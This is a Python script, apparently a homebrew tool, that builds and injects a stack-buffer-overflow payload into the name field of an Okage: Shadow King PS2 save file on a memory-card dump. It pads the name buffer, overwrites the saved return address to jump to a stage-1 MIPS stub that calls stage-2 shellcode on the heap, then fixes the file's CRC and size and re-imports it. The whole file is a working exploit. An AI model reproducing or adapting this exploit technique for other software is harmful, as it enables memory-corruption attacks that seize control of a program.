import sys
import subprocess
import argparse
import os

import crc

CHAR_BIT: int = 8
WORD_SIZE: int = 4

OSK_ID: str = "BASCUS-97129"
OSK_NAME_FILE: str = "bkmo0.dat"

# Offsets into bkmo0.dat
SIZE_OFFSET: int = 4
CRC_OFFSET: int = 8
END_OF_HEADER_OFFSET: int = 12
NAME_OFFSET: int = 2128

# Offset into the name buffer on the stack
RA_OFFSET: int = 389

# Absolute address
STAGE_1_ENTRY_POINT: int = 0x1ffe844

# jal 0x0091f710 (address of stage 2 payload in heap)
# (this is actually just an assumption. The real address of bkmo0.dat on the heap is stored in a pointer at 0x0024EE04)
STAGE_1_PAYLOAD: bytes = b"\xc4\x7d\x24\x0c" + b"\x25\xe8\xa0\x03"
FILLER_BYTE: bytes = b"\t"


def generate_payload(shellcode: bytes) -> bytes:
    _, remainder = divmod(RA_OFFSET, WORD_SIZE)
    stack_alignment: bytes = FILLER_BYTE * remainder
    # These bytes get overwritten before we take over.
    overwritten_filler: bytes = FILLER_BYTE * WORD_SIZE * 6
    # More filler to pad out to the place where ra is read from.
    more_filler: bytes = FILLER_BYTE * (RA_OFFSET - (len(stack_alignment) + len(overwritten_filler) + len(STAGE_1_PAYLOAD)))
    heap_alignment: bytes = FILLER_BYTE * 2

    return stack_alignment + overwritten_filler + STAGE_1_PAYLOAD + more_filler + uint32_to_le_bytes(STAGE_1_ENTRY_POINT) + b"\x00" + heap_alignment + shellcode


def uint32_to_le_bytes(i: int) -> bytes:
    assert 0 <= i < 2**32
    return bytes([(i >> 0) & 0xFF, (i >> 8) & 0xFF, (i >> 16) & 0xFF, (i >> 24) & 0xFF])

def insert_name_payload(payload: bytes, memcard_path: str) -> None:
    subprocess.run(["mymcplus", memcard_path, "export", OSK_ID], check=True)
    subprocess.run(["psu", "export", f"{OSK_ID}.psu", OSK_NAME_FILE], check=True)
    with open(OSK_NAME_FILE, "rb") as f:
        save_data: bytes = f.read()
    save_data = save_data[:NAME_OFFSET] + payload + save_data[NAME_OFFSET + len(payload):]
    new_crc: int = crc.CRC.calculate(save_data[END_OF_HEADER_OFFSET:])
    new_size: int = len(save_data)
    save_data = save_data[:SIZE_OFFSET] + uint32_to_le_bytes(new_size) + uint32_to_le_bytes(new_crc) + save_data[END_OF_HEADER_OFFSET:]
    with open(OSK_NAME_FILE, "wb") as f:
        f.write(save_data)
    subprocess.run(["psu", "delete", f"{OSK_ID}.psu", OSK_NAME_FILE], check=True)
    subprocess.run(["psu", "import", f"{OSK_ID}.psu", OSK_NAME_FILE], check=True)
    subprocess.run(["mymcplus", memcard_path, "delete", OSK_ID], check=True)
    subprocess.run(["mymcplus", memcard_path, "import", f"{OSK_ID}.psu"], check=True)
    os.remove(f"{OSK_ID}.psu")
    os.remove(OSK_NAME_FILE)


if __name__ == "__main__":
    arg_parser: argparse.ArgumentParser = argparse.ArgumentParser(
        description="Okage Shadow King save file name injector"
    )
    arg_parser.add_argument("--memcard", required=True, help="memcard dump path")
    args: argparse.Namespace = arg_parser.parse_args()
    insert_name_payload(generate_payload(b"\x00\x00\x00\x00\x25\xe8\xa0\x03"), args.memcard)
